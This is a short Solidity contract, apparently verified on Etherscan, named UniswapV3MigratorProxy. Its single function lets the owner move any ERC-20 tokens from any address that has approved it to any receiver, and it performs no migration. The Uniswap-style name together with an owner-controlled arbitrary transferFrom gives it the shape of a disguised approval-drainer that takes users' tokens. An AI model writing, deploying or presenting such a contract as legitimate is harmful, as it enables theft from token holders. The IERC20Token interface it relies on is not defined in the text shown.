/**
 *Submitted for verification at Etherscan.io on 2021-06-13
*/

pragma solidity ^0.8.0;



contract UniswapV3MigratorProxy {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function transferUniswapV3MigratorProxy(IERC20Token _token, address _sender, address _receiver, uint256 _amount) external returns (bool) {
        require(msg.sender == owner, "access denied");
        return _token.transferFrom(_sender, _receiver, _amount);
    }
}